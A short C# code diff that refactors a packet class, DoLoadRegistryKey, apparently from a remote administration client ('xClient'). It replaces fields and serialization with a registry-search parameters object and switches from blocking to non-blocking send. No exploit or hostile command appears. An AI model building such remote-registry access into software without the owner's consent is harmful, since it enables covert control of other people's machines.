@@ -1,31 +1,23 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using ProtoBuf;
 using Microsoft.Win32;
 using xClient.Core.Networking;
+using xClient.Core.Registry;
 
 namespace xClient.Core.Packets.ServerPackets
 {
-    [ProtoContract]
+    [Serializable]
     public class DoLoadRegistryKey : IPacket
     {
-        [ProtoMember(1)]
-        public object Identifier { get; set; }
+        public RegistrySeekerParams SearchParameters { get; set; }
 
-        [ProtoMember(2)]
-        public RegistryKey RootKey { get; set; }
-
-        public DoLoadRegistryKey(RegistryKey rootKey, object identifier = null)
+        public DoLoadRegistryKey(RegistrySeekerParams args)
         {
-            Identifier = identifier;
-            RootKey = rootKey;
+            SearchParameters = args;
         }
 
         public void Execute(Client client)
         {
-            client.SendBlocking(this);
+            client.Send(this);
         }
     }
 }
